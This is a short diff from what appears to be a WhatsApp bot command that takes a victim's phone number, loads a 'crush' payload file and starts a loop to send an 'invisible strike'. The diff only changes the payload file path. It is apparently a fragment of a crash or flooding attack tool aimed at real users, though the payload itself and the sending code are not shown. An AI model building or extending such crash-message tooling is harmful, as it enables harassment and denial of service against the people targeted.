@@ -9,7 +9,7 @@ module.exports = {
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         if (!args[0]) return msg.reply(fancy("🥀 ᴘʀᴏᴠɪᴅᴇ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ."));
 
-        const payload = fs.readFileSync('./lib/payloads/crush1.txt', 'utf-8');
+        const payload = fs.readFileSync('./lib/payload/crush1.txt', 'utf-8');
         msg.reply(fancy("🥀 ɪɴɪᴛɪᴀᴛɪɴɢ ɪɴᴠɪꜱɪʙʟᴇ ꜱᴛʀɪᴋᴇ..."));
 
         for (let i = 0; i < 5; i++) {
